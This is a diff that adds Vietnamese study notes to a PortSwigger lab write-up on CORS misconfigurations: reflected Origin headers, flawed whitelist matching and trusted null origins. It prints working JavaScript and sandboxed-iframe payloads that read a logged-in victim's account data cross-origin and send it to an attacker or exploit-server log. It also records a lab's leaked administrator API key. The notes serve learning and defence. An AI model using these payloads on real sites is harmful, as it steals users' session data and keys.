@@ -77,5 +77,174 @@ Deliver attack to victim và quan sát Access log:
 
 ![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image9.png?raw=true)
 
+# Server-generated ACAO header from client-specified Origin header
+
+Một số ứng dụng web cần cung cấp quyền truy cập cho nhiều miền khác nhau. Việc duy trì danh sách các miền được phép đòi hỏi nỗ lực liên tục, và bất kỳ sai sót nào cũng có thể làm gián đoạn chức năng. Do đó, một số ứng dụng chọn cách dễ dàng hơn là cho phép truy cập từ bất kỳ miền nào. 
+
+Một cách để làm điều này là đọc giá trị của header **Origin** từ yêu cầu và đưa vào header phản hồi một giá trị cho biết rằng miền gửi yêu cầu được phép. Ví dụ, giả sử ứng dụng web nhận được yêu cầu sau: 
+
+    GET /sensitive-victim-data HTTP/1.1
+    Host: vulnerable-website.com
+    Origin: https://malicious-website.com
+    Cookie: sessionid=...
+
+Sau đó, ứng dụng web phản hồi như sau:
+
+    HTTP/1.1 200 OK
+    Access-Control-Allow-Origin: https://malicious-website.com
+    Access-Control-Allow-Credentials: true
+    ...
+
+Các header này cho biết rằng **yêu cầu từ miền gửi (malicious-website.com) được chấp nhận** và các yêu cầu cross-origin có thể bao gồm cookie (Access-Control-Allow-Credentials: true), do đó, chúng sẽ được xử lý trong phiên đăng nhập của người dùng. 
+
+Vì ứng dụng web phản hồi lại bất kỳ giá trị **Origin** nào trong header **Access-Control-Allow-Origin**, điều này có nghĩa là **bất kỳ miền nào cũng có thể truy cập tài nguyên từ miền dễ bị tấn công**. Nếu phản hồi chứa thông tin nhạy cảm như API key hoặc CSRF token, kẻ tấn công có thể khai thác lỗ hổng này bằng cách chèn đoạn mã sau vào trang web của mình: 
+
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='//malicious-website.com/log?key='+this.responseText;
+    };
+
+Giải thích: 
+
+1. Kẻ tấn công chèn mã JS trên trang web độc hại của chúng.
+
+2. Khi người dùng (đã login vào **vulnerable-website.com**) truy cập trang của kẻ tấn công, mã JS sẽ gửi yêu cầu đến **/sensitive-victim-data**.
+
+3. Vì trang web dễ bị tấn công cho phép bất kỳ miền nào truy cập, nó phản hồi lại dữ liệu nhạy cảm.
+
+4. Mã JS thu thập phản hồi và gửi nó đến máy chủ của kẻ tấn công (**malicious-website.com/log**).
+
+5. Kẻ tấn công có thể thu thập dữ liệu nhạy cảm như API key hoặc token đăng nhập của nạn nhân.
+
+# Errors parsing Origin headers
+
+Một số ứng dụng web hỗ trợ truy cập từ nhiều nguồn (origin) bằng cách sử dụng **danh sách trắng (whitelist)** gồm các miền được phép. Khi nhận được một yêu cầu CORS, ứng dụng web sẽ **so sánh giá trị Origin được cung cấp với danh sách trắng**. Nếu **Origin** có trong danh sách, ứng dụng sẽ phản hồi lại trong header **Access-Control-Allow-Origin** để cho phép truy cập. 
+
+Ví dụ, ứng dụng web nhận được yêu cầu hợp lệ như sau: 
+
+    GET /data HTTP/1.1
+    Host: normal-website.com
+    ...
+    Origin: https://innocent-website.com
+
+Ứng dụng kiểm tra giá trị **Origin** trong danh sách các miền được phép. Nếu miền đó có trong danh sách, ứng dụng sẽ phản hồi như sau: 
+
+    HTTP/1.1 200 OK
+    ...
+    Access-Control-Allow-Origin: https://innocent-website.com
+
+**Lỗi có thể xảy ra**: Nếu ứng dụng **xử lý sai** hoặc **kiểm tra không đúng** danh sách trắng, kẻ tấn công có thể lợi dụng lỗ hổng này để vượt qua cơ chế bảo mật CORS và truy cập dữ liệu nhạy cảm. 
+
+# Errors parsing Origin headers - Continued
+
+Các lỗi thường xảy ra khi triển khai danh sách trắng (whitelist) Origin trong CORS. Một số tổ chức quyết định cho phép truy cập từ tất cả các tên miền phụ của họ (bao gồm cả các tên miền phụ chưa tồn tại). Một số ứng dụng web còn cho phép truy cập từ các tên miền của tổ chức khác, bao gồm cả các tên miền phụ. Những quy tắc này thường được triển khai bằng cách so khớp tiền tố hoặc hậu tố URL, hoặc sử dụng biểu thức chính quy. Bất kỳ sai sót nào trong việc triển khai có thể dẫn đến việc cấp quyền truy cập cho các tên miền bên ngoài không mong muốn. 
+
+Ví dụ, giả sử một ứng dụng web cho phép truy cập từ tất cả các tên miền kết thúc bằng: 
+
+    normal-website.com
+
+Kẻ tấn công có thể lợi dụng điều này bằng cách đăng ký tên miền: 
+
+    hackersnormal-website.com
+
+Kẻ tấn công có thể lợi dụng bằng cách sử dụng tên miền: 
+
+    normal-website.com.evil-user.net
+
+# Whitelisted null origin value
+
+Theo đặc tả của **Origin header**, giá trị **null** được hỗ trợ. Trình duyệt có thể gửi giá trị **null** trong **Origin header** trong một số tình huống đặc biệt, bao gồm: 
+
+- Chuyển hướng giữa các nguồn gốc khác nhau (cross-origin redirects).
+- Yêu cầu từ dữ liệu đã được tuần tự hóa (serialized data).
+- Yêu cầu sử dụng giao thức file.
+- Yêu cầu giữa các nguồn gốc trong môi trường sandbox. 
+
+# Lab: CORS vulnerability with trusted null origin
+
+![img](10)
+
+Truy cập lab: 
+
+![img](11)
+
+Đăng nhập vào tài khoản wiener: 
+
+![img](12)
+
+Tìm kiếm yêu cầu đến /accountDetails trong Burp Proxy history: 
+
+![img](13)
+
+Response của request này: 
+
+![img](14)
+
+Response có **Access-Control-Allow-Credentials header**, gợi ý rằng website có hỗ trợ CORS. 
+
+Thêm **Origin header** với giá trị null: 
+
+![img](15)
+
+Send request, quan sát response: 
+
+![img](16)
+
+=> **Access-Control-Allow-Origin header** có giá trị null. 
+
+Payload thêm vào exploit server: 
+
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','https://0af700940407afa780aa031000ec0037.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();
+        function reqListener() {
+            location='https://exploit-0a0b00500404af0980ca028b01700068.exploit-server.net//log?key='+encodeURIComponent(this.responseText);
+        };
+    </script>"></iframe>
+
+![img](17)
+
+Giải thích: 
+
+Trình duyệt có thể gửi **Origin: null** trong một số trường hợp đặc biệt, bao gồm:
+
+- sandbox trong < iframe >: Khi một iframe có thuộc tính sandbox nhưng không có allow-same-origin, trình duyệt sẽ chặn quyền truy cập thông tin từ tên miền gốc và thay thế giá trị Origin bằng null.
+
+- Sử dụng srcdoc: Khi srcdoc được dùng làm nguồn cho iframe, trang được tải bên trong iframe không có một nguồn gốc thực sự, dẫn đến Origin: null.
+
+Một số máy chủ có chính sách CORS kém bảo mật và cho phép null trong danh sách trắng (whitelist). Như phân tích ở trên, ứng dụng mục tiêu có cấu hình sai: 
+
+    Access-Control-Allow-Origin: null
+    Access-Control-Allow-Credentials: true
+
+Thì request sẽ được trình duyệt cho phép ngay cả khi nó đến từ một nguồn không xác định (null origin). Do đó, request từ iframe này vẫn có thể lấy dữ liệu từ https://0af700940407afa780aa031000ec0037.web-security-academy.net/accountDetails nếu máy chủ mục tiêu cho phép null như một nguồn hợp lệ.
+
+Quy trình: 
+
+- Kẻ tấn công tạo một trang HTML chứa iframe này.
+- Khi nạn nhân mở trang, iframe thực hiện request XMLHttpRequest (XHR) đến trang mục tiêu với withCredentials = true (cho phép gửi cookie phiên).
+- Nếu máy chủ mục tiêu chấp nhận **Origin: null**, phản hồi sẽ được gửi lại cho script trong iframe.
+- Script này sau đó gửi dữ liệu đánh cắp đến máy chủ của kẻ tấn công (exploit-server.net).
+
+
+
+=> Deliver exploit to victim và xem Access log: 
+
+![img](18)
+
+=> Tìm ra API key của administrator: a7emNqBMuJQzlV3feCvVhV2A7sTj7XrK
+
+Submit api key và solved bài lab!
+
+![img](19)
+
 
 
